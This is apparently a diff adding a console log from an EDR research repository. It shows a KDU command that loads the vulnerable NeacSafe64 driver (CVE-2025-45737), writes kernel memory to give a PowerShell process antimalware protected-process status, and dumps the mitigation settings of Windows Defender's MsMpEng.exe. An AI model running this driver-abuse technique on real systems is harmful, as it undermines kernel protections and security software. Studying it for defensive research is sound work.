@@ -1,0 +1,141 @@
+C:\Users\hacker\source\repos\EDR-Introspection\helpers\KDU\kdu.exe -pse "powershell.exe -c Import-Module C:\Users\hacker\source\repos\EDR-Introspection\helpers\sandbox-attacksurface-analyser-tools\NtObjectManager.psd1; (Get-NtProcess -ProcessId 3268 -Access AllAccess).Mitigations" -prv 54
+[#] Kernel Driver Utility v1.4.4 (build 2508) started, (c)2020 - 2025 KDU Project
+[#] Built at Sun Oct  5 15:56:48 2025, header checksum 0x65C74
+[#] Supported x64 OS : Windows 7 and above
+[*] CPU vendor string: AuthenticAMD
+[*] Windows version: 10.0 build 26100
+[*] SecureBoot is disabled on this machine
+[+] MSFT Driver block list is disabled
+[+] Selected provider: 54
+[+] The "VBoxVBoxVBox" hypervisor present
+[+] Drivers database "drv64.dll" loaded at 0x00007FFCA2BE0000
+[+] Drivers database version is OK
+[+] Firmware type (FirmwareTypeUefi)
+[+] Provider: "NeacSafe64 mini-filter driver (CVE-2025-45737)", Name "NeacSafe64"
+[+] Extracting vulnerable driver as "C:\Users\hacker\source\repos\EDR-Introspection\NeacSafe64.sys"
+[+] Driver port "OWNeacSafePort" has been opened successfully
+[+] Creating Process 'powershell.exe -c Import-Module C:\Users\hacker\source\repos\EDR-Introspection\helpers\sandbox-attacksurface-analyser-tools\NtObjectManager.psd1; (Get-NtProcess -ProcessId 3268 -Access AllAccess).Mitigations'
+[+] Created Process with PID 9396
+[+] Process with PID 9396 opened (PROCESS_QUERY_LIMITED_INFORMATION)
+[+] Process object (EPROCESS) found, 0xFFFF858BC1DF0080
+[+] EPROCESS->PS_PROTECTION, 0xFFFF858BC1DF067A
+[+] Kernel memory read at FFFF858BC1DF067A succeeded
+        PsProtection->Type: 0 (PsProtectedTypeNone)
+        PsProtection->Signer: 0 (PsProtectedSignerNone)
+        PsProtection->Audit: 0
+[+] Process object modified
+[+] Kernel memory read at FFFF858BC1DF067A succeeded
+        New PsProtection: 0x31
+        PsProtection->Type: 1 (PsProtectedTypeProtectedLight)
+        PsProtection->Signer: 3 (PsProtectedSignerAntimalware)
+        PsProtection->Audit: 0
+
+<PROCESS 3268 - MsMpEng.exe>
+  ImagePath: \Device\HarddiskVolume4\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\MsMpEng.exe
+  Win32ImagePath: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\MsMpEng.exe
+  CommandLine: "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\MsMpEng.exe"
+  IsRestricted: False
+  IsAppContainer: False
+  IsLowPrivilegeAppContainer: False
+  IntegrityLevel: System
+
+[SYSTEM CALL DISABLE]
+  DisallowWin32kSystemCalls: False
+  AuditDisallowWin32kSystemCalls: FalseDisallowFsctlSystemCalls: False
+  AuditDisallowFsctlSystemCalls: False
+
+[DEP]
+  DepEnabled: True
+  DisableAtlThunkEmulation: True
+  DepPermanent: True
+
+[ASLR]
+  EnableBottomUpRandomization: True
+  EnableForceRelocateImages: False
+  EnableHighEntropy: True
+  DisallowStrippedImages: False
+
+[STRICT HANDLE CHECK]
+  RaiseExceptionOnInvalidHandleReference: True
+  HandleExceptionsPermanentlyEnabled: True
+
+[FONT DISABLE]
+  DisableNonSystemFonts: False
+  AuditNonSystemFontLoading: False
+
+[DYNAMIC CODE]
+  ProhibitDynamicCode: False
+  AllowThreadOptOut: False
+  AllowRemoteDowngrade: False
+  AuditProhibitDynamicCode: False
+
+[EXTENSION POINTS]
+  DisableExtensionPoints: True
+
+[CONTROL FLOW GUARD]
+  EnabledControlFlowGuard: True
+  EnableExportSuppression: False
+  ControlFlowGuardStrictMode: False
+
+[SIGNATURE]
+  MicrosoftSignedOnly: False
+  StoreSignedOnly: False
+  SignedMitigationOptIn: True
+  AuditMicrosoftSignedOnly: False
+  AuditStoreSignedOnly: False
+
+[IMAGE LOAD]
+  NoRemoteImages: True
+  NoLowMandatoryLabelImages: False
+  PreferSystem32Images: False
+  AuditNoRemoteImages: False
+  AuditNoLowMandatoryLabelImages: False
+
+[SYSTEM CALL FILTER]
+  SystemCallFilterId: 0
+
+[CHILD PROCESS]
+  NoChildProcessCreation: False
+  AuditNoChildProcessCreation: False
+  AllowSecureProcessCreation: False
+
+[PAYLOAD RESTRICTIONS]
+  EnableExportAddressFilter: False
+  AuditExportAddressFilter: False
+  EnableExportAddressFilterPlus: False
+  AuditExportAddressFilterPlus: False
+  EnableImportAddressFilter: False
+  AuditImportAddressFilter: False
+  EnableRopStackPivot: False
+  AuditRopStackPivot: False
+  EnableRopCallerCheck: False
+  AuditRopCallerCheck: False
+  EnableRopSimExec: False
+  AuditRopSimExec: False
+
+[SIDE CHANNEL ISOLATION]
+  SmtBranchTargetIsolation: False
+  IsolateSecurityDomain: False
+  DisablePageCombine: False
+  SpeculativeStoreBypassDisable: False
+
+[USER SHADOW STACK]
+  EnableUserShadowStack: False
+  AuditUserShadowStack: False
+  SetContextIpValidation: False
+  AuditSetContextIpValidation: False
+  EnableUserShadowStackStrictMode: False
+  BlockNonCetBinaries: False
+  BlockNonCetBinariesNonEhcont: False
+  AuditBlockNonCetBinaries: False
+  CetDynamicApisOutOfProcOnly: True
+  SetContextIpValidationRelaxedMode: False
+
+[REDIRECTION TRUST]
+  EnforceRedirectionTrust: False
+  AuditRedirectionTrust: False
+
+
+
+[+] Vulnerable driver unloaded
+[+] Return value: 1. Bye-bye!
